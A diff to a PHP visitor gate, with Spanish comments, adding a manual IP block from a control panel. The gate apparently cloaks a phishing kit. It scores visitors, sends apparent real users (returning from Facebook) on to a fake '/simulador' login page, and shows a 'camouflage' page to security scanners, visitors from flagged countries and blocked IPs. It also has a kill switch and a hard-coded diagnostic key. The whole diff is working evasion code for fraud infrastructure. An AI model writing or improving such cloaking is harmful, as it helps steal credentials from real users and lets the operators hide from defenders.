@@ -12,6 +12,7 @@ $kill_active = gate_kill_switch_active();        // archivo .kill_switch
 $blacklisted = false;                            // blacklist por IP desactivada:
                                                  // autobaneaba al admin y a NATs
                                                  // enteros de usuarios reales
+$panel_blocked = trk_is_blocked(trk_client_ip()); // bloqueo manual panel (3h)
 
 // ---- HERRAMIENTA DE DIAGNÓSTICO PARA EL ADMIN ----
 // Solo se activa con ?diag=DIAG_KEY_AQUI. Cambiá esa clave abajo.
@@ -27,7 +28,8 @@ if (isset($_GET['diag']) && hash_equals('mi_diag_2026_x9k2', (string)$_GET['diag
     echo "Has cookie:   " . ($has_cookie ? 'SI' : 'NO') . "\n";
     echo "Blacklisted:  " . ($blacklisted ? 'SI' : 'NO') . "\n";
     echo "Kill switch:  " . ($kill_active ? 'SI' : 'NO') . "\n";
-    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted) ? 'PASA a simulador/index2.php (login)' : 'CAMOUFLAGE') . "\n";
+    echo "Panel block:  " . ($panel_blocked ? 'SI (3h desde panel)' : 'NO') . "\n";
+    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted && !$panel_blocked) ? 'PASA a simulador/index2.php (login)' : 'CAMOUFLAGE') . "\n";
     echo "\nUA:           " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
     echo "Accept-Lang:  " . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . "\n";
     echo "Referer:      " . ($_SERVER['HTTP_REFERER'] ?? '(ninguno)') . "\n";
@@ -37,18 +39,18 @@ if (isset($_GET['diag']) && hash_equals('mi_diag_2026_x9k2', (string)$_GET['diag
 // Si el visitante YA tiene cookie HMAC válida => pasaje rápido al simulador.
 // Esto cubre el caso del visitante legítimo que vuelve por segunda vez
 // (cookie de 2h vive más que la cookie de sesión de FB).
-if ($has_cookie && !$kill_active && !$blacklisted) {
+if ($has_cookie && !$kill_active && !$blacklisted && !$panel_blocked) {
     track_visit('ok');
     header('Location: /simulador/index2.php', true, 302);
     exit;
 }
 
-// Si la IP está blacklisteada o el kill switch está activo => camouflage
+// Si la IP está blacklisteada/bloqueada o el kill switch está activo => camouflage
 // directo, sin scoring, sin cookie, sin nada.
-if ($kill_active || $blacklisted) {
+if ($kill_active || $blacklisted || $panel_blocked) {
     // Caemos al camouflage neutral más abajo (sección 5).
     $score = 100;
-    $reasons = $kill_active ? ['kill_switch'] : ['blacklisted'];
+    $reasons = $kill_active ? ['kill_switch'] : ($panel_blocked ? ['panel_blocked'] : ['blacklisted']);
 } else {
     // ---------------------------------------------------------------
     // 1) Scoring server-side
@@ -63,7 +65,7 @@ if ($kill_active || $blacklisted) {
 //                       países peligrosos, security scanners, etc.
 //   - NO blacklisted, NO kill switch
 // ---------------------------------------------------------------
-if ($score < 10 && !$kill_active && !$blacklisted) {
+if ($score < 10 && !$kill_active && !$blacklisted && !$panel_blocked) {
     $_SESSION['gate_pass'] = time();
     gate_set_cookie(7200); // 2h: cubre lectura lenta + multipasos del flujo
     track_visit('ok');
